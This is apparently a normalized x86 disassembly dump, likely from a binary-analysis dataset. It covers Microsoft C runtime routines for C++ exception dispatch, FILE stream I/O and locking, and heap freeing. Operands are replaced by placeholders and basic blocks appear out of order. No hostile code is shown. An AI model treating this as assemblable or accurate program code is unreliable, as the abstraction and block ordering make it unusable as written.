mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_407d8a
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_4080a7
push 0x2c
push r--data
call sub_40be80
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_407006
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_4072c1
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_4072c1
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_4072c1
mov [ eax + 0x88 ] esi
call sub_4072c1
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_4070ab
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4081cd
mov eax [ ebp - 0x1c ]
call sub_40bec5
retn
sub_408140
mov esp [ ebp - 0x18 ]
call sub_4072c1
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_407e38
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4081cd
mov eax [ ebp - 0x1c ]
call sub_40bec5
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_4081cd
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_407059
pop ecx
call sub_4072c1
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_4072c1
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_407032
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_407f59
pop ecx
pop ecx
sub_408243
push 0xc
push r--data
call sub_40be80
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40b0d4
push ebx
push esi
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_40d34a
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_406820
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_40d34a
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_407fae
pop ecx
pop ecx
push eax
push esi
call sub_406820
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_40bec5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_407fae
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_4083c2
push 0x8
push r--data
call sub_40be80
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_407fae
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_406d59
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_408243
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bec5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_407fae
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_406d59
jmp r-xdata
sub_408454
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_4083c2
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_406d27
call sub_406d60
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_407e38
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4080a7
add esp 0x28
test eax eax
je r-xdata
sub_4084c2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_4072c1
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_4072c1
lea edi [ eax + 0x80 ]
call sub_40710b
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_406f93
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_40b0d4
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_406e1d
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_408454
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_4085c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_40b0d4
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_4072c1
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40b0d4
call sub_40b088
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4084c2
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_4072c1
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_4072c1
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_4072c1
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_40d34a
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_406f93
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_40b0d4
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_407f59
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_4072c1
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_4072c1
mov edi [ eax + 0x94 ]
call sub_4072c1
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_407fe8
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_407fe8
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_406d07
test al al
jne r-xdata
call sub_40b0d4
cmp eax 0x19930522
jne r-xdata
call sub_4072c1
call sub_4072c1
call sub_4072c1
mov [ eax + 0x88 ] esi
call sub_4072c1
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_407d8a
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_407f59
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_406719
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_406c8a
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_408454
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_406d60
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_407e38
add esp 0x10
push [ esi + 0x1c ]
call sub_40805e
sub_40895b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_4072c1
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_4085c9
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_407e38
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408a41
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_40c61a
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40c5d8
pop ecx
mov [ esi ] eax
pop esi
sub_408a86
push 0xc
push r--data
call sub_40be80
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_408e99
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_40d47e
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_40bec5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408b72
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_40d35c
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_408b7a
push 0xc
push r--data
call sub_40be80
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_408e99
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_40d47e
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_40bec5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408c6e
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_40d4a4
pop ecx
pop ecx
mov ecx [ esi ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
inc [ esi ]
jmp r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_408c76
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_40d47e
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_40d608
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_408d59
push 0xc
push r--data
call sub_40be80
xor eax eax
cmp [ ebp + 0xc ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0xc ]
call sub_408e99
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408c76
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408db8
mov eax [ ebp - 0x1c ]
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
call sub_40bec5
retn
sub_408dc8
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_409f5e
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_409f5e
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_408e99
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_40b2e6
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_408eda
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_40b2e6
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_408f0c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_40b20d
pop ecx
pop ebp
retn
sub_408f48
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_40b20d
pop ecx
pop ebp
retn
sub_408f77
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40d47e
pop ecx
push eax
call sub_40ddea
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_408fdf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_408f77
pop ecx
test eax eax
je r-xdata
push esi
call sub_409027
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_40d47e
push eax
call sub_40debe
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_409027
push 0x14
push r--data
call sub_40be80
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4090f8
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_40bec5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_408eda
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_4090c9
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_408fdf
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_408fdf
pop ecx
cmp eax 0xffffffff
jne r-xdata
